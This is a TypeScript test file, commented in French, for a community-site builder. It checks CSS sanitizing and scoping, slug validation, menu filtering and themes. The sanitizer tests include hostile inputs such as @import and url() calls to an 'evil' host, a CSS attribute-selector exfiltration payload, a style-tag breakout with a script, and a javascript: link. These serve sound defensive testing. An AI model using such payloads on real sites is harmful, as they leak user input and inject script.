/**
 * CSS libre, slugs, menu et thèmes du site communautaire.
 *
 * Le CSS libre est servi sous le domaine du dashboard : il ne doit charger
 * aucune ressource externe ni atteindre l'habillage Kotbo hors de `.site-root`.
 */
import { describe, expect, test } from 'bun:test';
import {
  normalizeSiteNavigation,
  prepareSiteCss,
  readableOn,
  resolveSiteTheme,
  sanitizeSiteCss,
  scopeSiteCss,
  slugify,
  validatePageSlug,
  validateSiteSlug,
} from '@kotbo/shared';

const ASSETS = '/s/_/a/';

describe('filtrage du CSS libre', () => {
  test('retire @import, même échappé', () => {
    expect(sanitizeSiteCss('@import url(https://evil/x.css); a{color:red}', ASSETS)).not.toContain('import');
    expect(sanitizeSiteCss('@\\69mport "https://evil/x.css"; a{color:red}', ASSETS)).not.toMatch(/import|evil/);
  });

  test('neutralise les URL externes, garde les images du site', () => {
    const css = sanitizeSiteCss('a{background:url(https://evil/p.gif)} b{background:url("/s/_/a/abc.png")}', ASSETS);
    expect(css).not.toContain('evil');
    expect(css).toContain('url("/s/_/a/abc.png")');
  });

  test('refuse l’exfiltration par sélecteur d’attribut', () => {
    const css = sanitizeSiteCss('input[value^="a"]{background:url(https://evil/?c=a)}', ASSETS);
    expect(css).not.toContain('evil');
  });

  test('refuse image-set, qui charge sans url()', () => {
    expect(sanitizeSiteCss('a{background:image-set("https://evil/x.png" 1x)}', ASSETS)).not.toContain('image-set');
  });

  test('interdit les superpositions fixes', () => {
    expect(sanitizeSiteCss('.x{position:fixed;inset:0}', ASSETS)).not.toContain('fixed');
    expect(sanitizeSiteCss('.x{position:\\66ixed}', ASSETS)).not.toContain('fixed');
  });

  test('ne peut pas fermer la balise style', () => {
    expect(sanitizeSiteCss('a{}</style><script>alert(1)</script>', ASSETS)).not.toMatch(/[<>]/);
  });
});

describe('portée du CSS libre', () => {
  test('préfixe chaque sélecteur', () => {
    expect(scopeSiteCss('a, .b > c{color:red}')).toBe('.site-root a,.site-root .b > c{color:red}');
  });

  test('ramène html, body et :root à la racine', () => {
    expect(scopeSiteCss('body{margin:0} :root{--x:1} body.dark a{color:red}')).toBe(
      '.site-root{margin:0}\n.site-root{--x:1}\n.site-root.dark a{color:red}',
    );
  });

  test('parcourt @media, garde @keyframes, retire le reste', () => {
    const out = scopeSiteCss('@media (max-width:600px){a{color:red}} @keyframes k{from{opacity:0}to{opacity:1}} @font-feature-values X{@swash{a:1}}');
    expect(out).toContain('@media (max-width:600px){.site-root a{color:red}}');
    expect(out).toContain('@keyframes k{from{opacity:0}to{opacity:1}}');
    expect(out).not.toContain('font-feature-values');
  });

  test('ne double pas le préfixe déjà présent', () => {
    expect(scopeSiteCss('.site-root .x{color:red}')).toBe('.site-root .x{color:red}');
  });

  test('une accolade dans une chaîne ne casse pas le découpage', () => {
    expect(scopeSiteCss('a::after{content:"}"} b{color:red}')).toBe('.site-root a::after{content:"}"}\n.site-root b{color:red}');
  });

  test('chaîne complète', () => {
    expect(prepareSiteCss('body{background:url(https://x/y.png)}', ASSETS)).toBe('.site-root{background:none}');
  });
});

describe('slugs', () => {
  test('slugify replie accents et ponctuation', () => {
    expect(slugify('  Les Nerds : Été 2026 !  ')).toBe('les-nerds-ete-2026');
  });

  test('slug de site', () => {
    expect(validateSiteSlug('ab')).toBe('too_short');
    expect(validateSiteSlug('123456789012345678')).toBe('invalid');
    expect(validateSiteSlug('Mon-Serveur')).toBe('invalid');
    expect(validateSiteSlug('kotbo')).toBe('reserved');
    expect(validateSiteSlug('les-nerds')).toBeNull();
  });

  test('slug de page : segments du routeur réservés', () => {
    expect(validatePageSlug('wiki')).toBe('reserved');
    expect(validatePageSlug('search')).toBe('reserved');
    expect(validatePageSlug('sitemap.xml')).toBe('invalid');
    expect(validatePageSlug('equipe')).toBeNull();
  });
});

describe('menu', () => {
  test('deux niveaux au plus, cibles vérifiées', () => {
    const nav = normalizeSiteNavigation([
      { label: 'Wiki', target: { type: 'section', section: 'wiki' } },
      { label: 'Mal', target: { type: 'url', href: 'javascript:x' } },
      {
        label: 'Plus',
        children: [{ label: 'Site', target: { type: 'url', href: 'https://kotbo.fr' }, children: [{ label: 'trop profond', target: { type: 'section', section: 'blog' } }] }],
      },
    ]);
    expect(nav.map((n) => n.label)).toEqual(['Wiki', 'Plus']);
    expect(nav[1].children[0].children).toEqual([]);
  });
});

describe('thèmes', () => {
  test('thème inconnu : thème par défaut', () => {
    expect(resolveSiteTheme('inexistant', {}).key).toBe('verre');
  });

  test('réglages filtrés', () => {
    const theme = resolveSiteTheme('clair', { accent: 'red', radius: 99, font: 'Comic Sans' });
    expect(theme.accent).toBe('#5865f2');
    expect(theme.radius).toBe(28);
    expect(theme.font).toBe('Inter');
  });

  test('texte sur accent lisible', () => {
    expect(readableOn('#ffff00')).toBe('#0b0b0f');
    expect(readableOn('#1e1b4b')).toBe('#ffffff');
  });
});
